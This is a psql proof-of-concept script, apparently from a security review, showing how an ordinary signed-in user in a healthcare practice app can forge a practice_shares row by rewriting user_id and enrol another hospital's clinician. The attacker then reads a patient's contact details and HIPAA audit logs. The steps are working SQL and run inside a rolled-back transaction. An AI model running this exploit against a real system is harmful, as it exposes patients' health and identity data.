-- R2: the tenant functions accept ANY practice_shares row (is_active not required,
-- by the 20261008 decision). A practice admin's "end share" UPDATE can also rewrite
-- user_id, and any signed-in user can create a practice. So the "row" is forgeable.
\set ON_ERROR_STOP 1
\pset footer off
BEGIN;

-- ---- Fixtures, as superuser: hospital B, its clinician, its patient ----------
INSERT INTO auth.users (id, email, email_confirmed_at) VALUES
  ('c3000000-0000-4000-8000-000000000003', 'attacker@example.com', now()),
  ('d4000000-0000-4000-8000-000000000004', 'admin-b@example.com',  now()),
  ('e5000000-0000-4000-8000-000000000005', 'dr-d@example.com',     now()),
  ('f6000000-0000-4000-8000-000000000006', 'bode@example.com',     now());
INSERT INTO public.profiles (user_id, name, email, phone_number) VALUES
  ('c3000000-0000-4000-8000-000000000003', 'Attacker', 'attacker@example.com', NULL),
  ('d4000000-0000-4000-8000-000000000004', 'Admin B',  'admin-b@example.com',  NULL),
  ('e5000000-0000-4000-8000-000000000005', 'Dr D',     'dr-d@example.com',     NULL),
  ('f6000000-0000-4000-8000-000000000006', 'Bode Theirs', 'bode@example.com',  '+44 7700 900123')
ON CONFLICT (user_id) DO UPDATE
  SET name = EXCLUDED.name, email = EXCLUDED.email, phone_number = EXCLUDED.phone_number;

SELECT set_config('request.jwt.claim.sub', 'd4000000-0000-4000-8000-000000000004', true);
INSERT INTO public.practices (id, name, created_by)
VALUES ('b0000000-0000-4000-8000-00000000000b', 'Hospital B', 'd4000000-0000-4000-8000-000000000004');
INSERT INTO public.practice_members (practice_id, user_id, role, status) VALUES
  ('b0000000-0000-4000-8000-00000000000b', 'd4000000-0000-4000-8000-000000000004', 'owner', 'active'),
  ('b0000000-0000-4000-8000-00000000000b', 'e5000000-0000-4000-8000-000000000005', 'clinician', 'active')
ON CONFLICT (practice_id, user_id) DO UPDATE SET role = EXCLUDED.role, status = EXCLUDED.status;
SELECT set_config('request.jwt.claim.sub', 'f6000000-0000-4000-8000-000000000006', true);
INSERT INTO public.practice_shares (practice_id, user_id, is_active, share_all, permissions)
VALUES ('b0000000-0000-4000-8000-00000000000b', 'f6000000-0000-4000-8000-000000000006', true, true, '{}');
-- Dr D's work on Bode, at hospital B.
INSERT INTO public.hipaa_audit_logs (user_id, action, resource_type, resource_id, patient_user_id, ip_address)
VALUES ('e5000000-0000-4000-8000-000000000005', 'internal_note_written', 'internal_note',
        'note-123', 'f6000000-0000-4000-8000-000000000006', '10.0.0.7');

-- ---- The attacker: an ordinary signed-in account, acting under RLS -----------
SELECT set_config('request.jwt.claim.sub', 'c3000000-0000-4000-8000-000000000003', true);
SET LOCAL ROLE authenticated;

\echo '--- 1. before: attacker resolves Bode'
SELECT * FROM public.get_patient_identity(ARRAY['f6000000-0000-4000-8000-000000000006'::uuid]);

\echo '--- 2. attacker creates a practice (auto-enrolled as owner) and shares THEMSELVES with it'
INSERT INTO public.practices (id, name, created_by)
VALUES ('a0000000-0000-4000-8000-00000000000a', 'Front Co', 'c3000000-0000-4000-8000-000000000003');
INSERT INTO public.practice_shares (practice_id, user_id, is_active, share_all, permissions)
VALUES ('a0000000-0000-4000-8000-00000000000a', 'c3000000-0000-4000-8000-000000000003', true, true, '{}');

\echo '--- 3. attacker "ends" that share as its admin, rewriting user_id to Bode'
UPDATE public.practice_shares
   SET is_active = false, user_id = 'f6000000-0000-4000-8000-000000000006'
 WHERE practice_id = 'a0000000-0000-4000-8000-00000000000a'
   AND user_id = 'c3000000-0000-4000-8000-000000000003';

\echo '--- 4. attacker enrols hospital B''s Dr D as an active member of Front Co (no consent from D)'
INSERT INTO public.practice_members (practice_id, user_id, role, status)
VALUES ('a0000000-0000-4000-8000-00000000000a', 'e5000000-0000-4000-8000-000000000005', 'clinician', 'active');

\echo '--- 5a. get_patient_identity'
SELECT * FROM public.get_patient_identity(ARRAY['f6000000-0000-4000-8000-000000000006'::uuid]);
\echo '--- 5b. practice_patient_overview(Front Co)'
SELECT patient_user_id, name, email, is_active FROM public.practice_patient_overview('a0000000-0000-4000-8000-00000000000a');
\echo '--- 5c. practice_audit_log(Front Co, search ''Bode'') -- hospital B activity'
SELECT actor_name, action, resource_id, patient_name, ip_address
  FROM public.practice_audit_log('a0000000-0000-4000-8000-00000000000a', 'Bode');

RESET ROLE;
\echo '--- read-back as superuser: the forged row'
SELECT practice_id, user_id, is_active FROM public.practice_shares
 WHERE practice_id = 'a0000000-0000-4000-8000-00000000000a';
ROLLBACK;
